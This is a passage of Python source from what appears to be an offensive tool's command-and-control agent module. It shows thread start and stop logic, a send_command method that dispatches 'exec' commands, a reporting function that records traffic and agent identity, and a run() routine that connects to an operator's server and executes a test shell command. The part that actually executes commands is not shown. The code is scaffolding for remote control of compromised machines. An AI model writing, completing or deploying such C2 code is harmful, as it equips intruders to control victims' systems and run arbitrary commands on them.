        self.start_heartbeat()
        
        # Start command processor
        self.start_command_processor()
        
        self.logger.info('C2 communication module started successfully')
        return True
    
    def stop(self) -> None:
        """Stop the C2 communication module."""
        self.logger.info('Stopping Command & Control module')
        
        # Set stop event to signal threads to stop
        self.stop_event.set()
        
        # Wait for threads to complete
        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            self.heartbeat_thread.join(timeout=5)
        
        if self.command_thread and self.command_thread.is_alive():
            self.command_thread.join(timeout=5)
        
        # Clean up connection
        self._cleanup_connection()
        
        # Clear command queue
        while not self.command_queue.empty():
            try:
                self.command_queue.get_nowait()
                self.command_queue.task_done()
            except queue.Empty:
                break
        
        self.logger.info('C2 communication module stopped')
    
    def send_command(self, command_type: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Send a command directly (for testing or internal use).
        
        Args:
            command_type: Type of command to send
            params: Command parameters
            
        Returns:
            Dict[str, Any]: Command execution result
        """
        # Create command
        command = {
            'id': str(uuid.uuid4()),
            'type': command_type,
            'params': params,
            'timestamp': datetime.now().isoformat()
        }
        
        # Execute command
        result = self._execute_command(command)
        
        return result
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate a comprehensive C2 communication report.
        
        Returns:
            Dict[str, Any]: Full C2 communication report
        """
        report = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'agent_id': self.agent_id,
            'agent_info': self.agent_info,
            'server': f'{self.server}:{self.port}',
            'communication_type': self.communication_type,
            'status': 'connected' if self.connected else 'disconnected',
            'encryption_enabled': self.encryption_enabled,
            'statistics': {
                'commands_received': self.commands_received,
                'commands_executed': self.commands_executed,
                'commands_failed': self.commands_failed,
                'bytes_sent': self.bytes_sent,
                'bytes_received': self.bytes_received,
                'last_heartbeat': self.last_heartbeat.isoformat() if self.last_heartbeat else None
            },
            'supported_commands': self.SUPPORTED_COMMANDS,
            'dev_mode': self.dev_mode
        }
        
        return report


def run(args: argparse.Namespace) -> None:
    """Setup and manage C2 communication"""
    logger.info(f"Setting up C2 communication with server: {args.server}:{args.port}")
    logger.debug(f"C2 parameters: {vars(args)}")
    
    # Check if in development mode
    is_dev_mode = config.get_mode()
    
    if is_dev_mode:
        logger.info("Running in DEVELOPMENT mode - detailed analysis enabled")
    else:
        logger.info("Running in PRODUCTION mode - optimized for performance")
    
    # Prepare C2 parameters
    server = args.server
    port = args.port
    communication_type = getattr(args, 'type', 'https')
    
    # Create and configure C2 communication instance
    c2 = CommandControl(
        server=server,
        port=port,
        communication_type=communication_type,
        heartbeat_interval=getattr(args, 'heartbeat', CommandControl.DEFAULT_HEARTBEAT_INTERVAL),
        dev_mode=is_dev_mode
    )
    
    try:
        # Start the C2 communication
        if c2.start():
            logger.info(f"C2 communication established with {server}:{port}")
            
            # In an actual agent, we would keep running indefinitely
            # For this example, we'll run for a short period
            if is_dev_mode:
                logger.info("In dev mode - running for 30 seconds")
                # Simulate some commands in dev mode
                time.sleep(5)  # Give time for initial connection
                
                # Send a test command
                test_result = c2.send_command('exec', {'command': 'echo Test command executed'})
                logger.info(f"Test command result: {test_result.get('success')}")
                
                # Run for a bit longer
                time.sleep(25)
            else:
                # In production mode, we would run indefinitely
                # For this example, we'll just wait a moment
                time.sleep(5)
                
    except KeyboardInterrupt:
        logger.info("Received keyboard interrupt, shutting down C2 communication")
    except Exception as e:
        logger.error(f"Error in C2 communication: {str(e)}")
    finally:
        # Stop the C2 communication
        c2.stop()
        
        # Generate and save report if output is specified
        if hasattr(args, 'output') and args.output:
            try:
                report = c2.generate_report()
                with open(args.output, 'w') as f:
                    json.dump(report, f, indent=2)
                logger.info(f"C2 communication report saved to: {args.output}")
            except Exception as e:
                logger.error(f"Error saving C2 report: {str(e)}")
    
    logger.info(f"C2 communication setup completed with server: {args.server}:{args.port}")